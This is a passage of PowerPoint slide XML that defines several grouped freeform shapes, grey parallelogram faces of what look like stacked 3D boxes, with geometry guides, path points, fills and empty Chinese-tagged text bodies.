                        <a:gd name="T1" fmla="*/ 0 h 696"/>
                        <a:gd name="T2" fmla="*/ 0 w 1588"/>
                        <a:gd name="T3" fmla="*/ 0 h 696"/>
                        <a:gd name="T4" fmla="*/ 0 w 1588"/>
                        <a:gd name="T5" fmla="*/ 0 h 696"/>
                        <a:gd name="T6" fmla="*/ 0 w 1588"/>
                        <a:gd name="T7" fmla="*/ 0 h 696"/>
                        <a:gd name="T8" fmla="*/ 0 w 1588"/>
                        <a:gd name="T9" fmla="*/ 0 h 696"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1588"/>
                        <a:gd name="T16" fmla="*/ 0 h 696"/>
                        <a:gd name="T17" fmla="*/ 1588 w 1588"/>
                        <a:gd name="T18" fmla="*/ 696 h 696"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1588" h="696">
                          <a:moveTo>
                            <a:pt x="0" y="619"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="124" y="696"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1588" y="83"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1467" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="619"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="47" name="Group 29"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5027" y="1800"/>
                    <a:ext cx="398" cy="478"/>
                    <a:chOff x="5027" y="1800"/>
                    <a:chExt cx="398" cy="478"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="60" name="Freeform 30"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5058" y="1827"/>
                      <a:ext cx="367" cy="451"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1471"/>
                        <a:gd name="T1" fmla="*/ 0 h 1353"/>
                        <a:gd name="T2" fmla="*/ 0 w 1471"/>
                        <a:gd name="T3" fmla="*/ 0 h 1353"/>
                        <a:gd name="T4" fmla="*/ 0 w 1471"/>
                        <a:gd name="T5" fmla="*/ 0 h 1353"/>
                        <a:gd name="T6" fmla="*/ 0 w 1471"/>
                        <a:gd name="T7" fmla="*/ 0 h 1353"/>
                        <a:gd name="T8" fmla="*/ 0 w 1471"/>
                        <a:gd name="T9" fmla="*/ 0 h 1353"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1471"/>
                        <a:gd name="T16" fmla="*/ 0 h 1353"/>
                        <a:gd name="T17" fmla="*/ 1471 w 1471"/>
                        <a:gd name="T18" fmla="*/ 1353 h 1353"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1471" h="1353">
                          <a:moveTo>
                            <a:pt x="0" y="1353"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="616"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1471" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1468" y="694"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1353"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="61" name="Freeform 31"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5027" y="2006"/>
                      <a:ext cx="31" cy="272"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 122"/>
                        <a:gd name="T1" fmla="*/ 0 h 814"/>
                        <a:gd name="T2" fmla="*/ 0 w 122"/>
                        <a:gd name="T3" fmla="*/ 0 h 814"/>
                        <a:gd name="T4" fmla="*/ 0 w 122"/>
                        <a:gd name="T5" fmla="*/ 0 h 814"/>
                        <a:gd name="T6" fmla="*/ 0 w 122"/>
                        <a:gd name="T7" fmla="*/ 0 h 814"/>
                        <a:gd name="T8" fmla="*/ 0 w 122"/>
                        <a:gd name="T9" fmla="*/ 0 h 814"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 122"/>
                        <a:gd name="T16" fmla="*/ 0 h 814"/>
                        <a:gd name="T17" fmla="*/ 122 w 122"/>
                        <a:gd name="T18" fmla="*/ 814 h 814"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="122" h="814">
                          <a:moveTo>
                            <a:pt x="0" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="122" y="77"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="122" y="814"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="736"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="62" name="Freeform 32"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5027" y="1800"/>
                      <a:ext cx="398" cy="232"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1593"/>
                        <a:gd name="T1" fmla="*/ 0 h 695"/>
                        <a:gd name="T2" fmla="*/ 0 w 1593"/>
                        <a:gd name="T3" fmla="*/ 0 h 695"/>
                        <a:gd name="T4" fmla="*/ 0 w 1593"/>
                        <a:gd name="T5" fmla="*/ 0 h 695"/>
                        <a:gd name="T6" fmla="*/ 0 w 1593"/>
                        <a:gd name="T7" fmla="*/ 0 h 695"/>
                        <a:gd name="T8" fmla="*/ 0 w 1593"/>
                        <a:gd name="T9" fmla="*/ 0 h 695"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1593"/>
                        <a:gd name="T16" fmla="*/ 0 h 695"/>
                        <a:gd name="T17" fmla="*/ 1593 w 1593"/>
                        <a:gd name="T18" fmla="*/ 695 h 695"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1593" h="695">
                          <a:moveTo>
                            <a:pt x="0" y="618"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="122" y="695"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1593" y="79"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1475" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="618"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="48" name="Group 33"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5066" y="1835"/>
                    <a:ext cx="397" cy="477"/>
                    <a:chOff x="5066" y="1835"/>
                    <a:chExt cx="397" cy="477"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="57" name="Freeform 34"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5097" y="1862"/>
                      <a:ext cx="366" cy="450"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1467"/>
                        <a:gd name="T1" fmla="*/ 0 h 1350"/>
                        <a:gd name="T2" fmla="*/ 0 w 1467"/>
                        <a:gd name="T3" fmla="*/ 0 h 1350"/>
                        <a:gd name="T4" fmla="*/ 0 w 1467"/>
                        <a:gd name="T5" fmla="*/ 0 h 1350"/>
                        <a:gd name="T6" fmla="*/ 0 w 1467"/>
                        <a:gd name="T7" fmla="*/ 0 h 1350"/>
                        <a:gd name="T8" fmla="*/ 0 w 1467"/>
                        <a:gd name="T9" fmla="*/ 0 h 1350"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1467"/>
                        <a:gd name="T16" fmla="*/ 0 h 1350"/>
                        <a:gd name="T17" fmla="*/ 1467 w 1467"/>
                        <a:gd name="T18" fmla="*/ 1350 h 1350"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1467" h="1350">
                          <a:moveTo>
                            <a:pt x="0" y="1350"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="614"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1467" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1461" y="689"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1350"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="58" name="Freeform 35"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5066" y="2041"/>
                      <a:ext cx="31" cy="271"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 123"/>
                        <a:gd name="T1" fmla="*/ 0 h 813"/>
                        <a:gd name="T2" fmla="*/ 0 w 123"/>
                        <a:gd name="T3" fmla="*/ 0 h 813"/>
                        <a:gd name="T4" fmla="*/ 0 w 123"/>
                        <a:gd name="T5" fmla="*/ 0 h 813"/>
                        <a:gd name="T6" fmla="*/ 0 w 123"/>
                        <a:gd name="T7" fmla="*/ 0 h 813"/>
                        <a:gd name="T8" fmla="*/ 0 w 123"/>
                        <a:gd name="T9" fmla="*/ 0 h 813"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 123"/>
                        <a:gd name="T16" fmla="*/ 0 h 813"/>
                        <a:gd name="T17" fmla="*/ 123 w 123"/>
                        <a:gd name="T18" fmla="*/ 813 h 813"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="123" h="813">
                          <a:moveTo>
                            <a:pt x="1" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="123" y="77"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="123" y="813"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="735"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="59" name="Freeform 36"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5066" y="1835"/>
                      <a:ext cx="397" cy="232"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1590"/>
                        <a:gd name="T1" fmla="*/ 0 h 696"/>
                        <a:gd name="T2" fmla="*/ 0 w 1590"/>
                        <a:gd name="T3" fmla="*/ 0 h 696"/>
                        <a:gd name="T4" fmla="*/ 0 w 1590"/>
                        <a:gd name="T5" fmla="*/ 0 h 696"/>
                        <a:gd name="T6" fmla="*/ 0 w 1590"/>
                        <a:gd name="T7" fmla="*/ 0 h 696"/>
                        <a:gd name="T8" fmla="*/ 0 w 1590"/>
                        <a:gd name="T9" fmla="*/ 0 h 696"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1590"/>
                        <a:gd name="T16" fmla="*/ 0 h 696"/>
                        <a:gd name="T17" fmla="*/ 1590 w 1590"/>
                        <a:gd name="T18" fmla="*/ 696 h 696"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1590" h="696">
                          <a:moveTo>
                            <a:pt x="0" y="618"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="123" y="696"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1590" y="82"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1466" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="618"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="49" name="Group 37"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5106" y="1868"/>
                    <a:ext cx="399" cy="477"/>
                    <a:chOff x="5106" y="1868"/>
                    <a:chExt cx="399" cy="477"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="54" name="Freeform 38"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5137" y="1895"/>
                      <a:ext cx="367" cy="450"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1470"/>
                        <a:gd name="T1" fmla="*/ 0 h 1351"/>
                        <a:gd name="T2" fmla="*/ 0 w 1470"/>
                        <a:gd name="T3" fmla="*/ 0 h 1351"/>
                        <a:gd name="T4" fmla="*/ 0 w 1470"/>
                        <a:gd name="T5" fmla="*/ 0 h 1351"/>
                        <a:gd name="T6" fmla="*/ 0 w 1470"/>
                        <a:gd name="T7" fmla="*/ 0 h 1351"/>
                        <a:gd name="T8" fmla="*/ 0 w 1470"/>
                        <a:gd name="T9" fmla="*/ 0 h 1351"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1470"/>
                        <a:gd name="T16" fmla="*/ 0 h 1351"/>
                        <a:gd name="T17" fmla="*/ 1470 w 1470"/>
                        <a:gd name="T18" fmla="*/ 1351 h 1351"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1470" h="1351">
                          <a:moveTo>
                            <a:pt x="0" y="1351"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="616"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1470" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1467" y="693"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1351"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="55" name="Freeform 39"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5106" y="2074"/>
                      <a:ext cx="31" cy="271"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 122"/>
                        <a:gd name="T1" fmla="*/ 0 h 812"/>
                        <a:gd name="T2" fmla="*/ 0 w 122"/>
                        <a:gd name="T3" fmla="*/ 0 h 812"/>
                        <a:gd name="T4" fmla="*/ 0 w 122"/>
                        <a:gd name="T5" fmla="*/ 0 h 812"/>
                        <a:gd name="T6" fmla="*/ 0 w 122"/>
                        <a:gd name="T7" fmla="*/ 0 h 812"/>
                        <a:gd name="T8" fmla="*/ 0 w 122"/>
                        <a:gd name="T9" fmla="*/ 0 h 812"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 122"/>
                        <a:gd name="T16" fmla="*/ 0 h 812"/>
                        <a:gd name="T17" fmla="*/ 122 w 122"/>
                        <a:gd name="T18" fmla="*/ 812 h 812"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="122" h="812">
                          <a:moveTo>
                            <a:pt x="0" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="122" y="77"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="122" y="812"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="735"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
